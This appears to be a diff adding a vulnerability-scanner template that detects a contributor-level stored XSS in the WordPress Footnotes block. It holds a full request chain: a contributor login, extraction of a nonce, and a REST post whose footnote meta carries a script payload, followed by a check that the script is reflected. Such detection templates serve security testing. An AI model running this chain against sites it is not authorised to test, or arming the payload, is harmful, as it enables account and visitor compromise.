@@ -1,0 +1,87 @@
+id: footnote-xss
+
+info:
+  name: Contributor+ Stored XSS via Footnotes Block
+  author: nqdung2002
+  severity: medium
+  description: WordPress does not escape some of its Footnotes block options before outputting them back in a page/post where the block is embed.
+  impact: This could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks.
+  reference:
+    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/wordpress-core-63-631-authenticatedcontributor-cross-site-scripting-via-footnotes-block?asset_slug=wordpress
+    - https://wpscan.com/vulnerability/63270b61-dddd-4cc0-a091-a04cb4f682ec/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 6.4
+    cwe-id: CWE-79
+  metadata:
+    max-request: 6
+    framework: wordpress
+  tags: wpscan,xss,wp,wordpress,footnote,sxss,post,cross-site scripting
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{contributor}}&pwd={{password}}
+      - |
+        GET /wp-admin/ HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /wp-admin/post-new.php HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /{{route}}/{{postid}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-HTTP-Method-Override: PUT
+        X-WP-Nonce: {{nonce}}
+
+        {
+          "id": {{postid}},
+          "title": "Stored XSS via Footnote Block",
+          "content": "<!-- wp:paragraph -->\n<p>Test CVE<sup data-fn=\"testid\" class=\"fn\"><a href=\"#testid\" id=\"testid-link\">1</a></sup></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:footnotes /-->",
+          "meta": {
+            "footnotes": "[{\"content\":\"<script>alert(document.domain)</script>\",\"id\":\"testid\"}]"
+          },
+          "status": "pending"
+        }
+      - |
+        GET /?p={{postid}} HTTP/1.1
+        Host: {{Hostname}}
+    host-redirects: true
+    max-redirects: 1
+    stop-at-first-match: true
+    payloads:
+      contributor: 
+        - "contributor"
+      password: 
+        - "123"
+      route:
+        - "?rest_route=/wp/v2/posts"
+    attack: clusterbomb
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body_5, "<script>alert(document.domain)</script>")'
+        condition: and
+        
+    extractors:
+      - type: regex
+        name: postid
+        part: body_3
+        group: 1
+        internal: true
+        regex:
+          - 'post=(\d+)'
+      - type: regex
+        name: nonce
+        part: body_3
+        group: 1
+        internal: true
+        regex:
+          - 'createNonceMiddleware\(\s"(.*)\"\s\)'
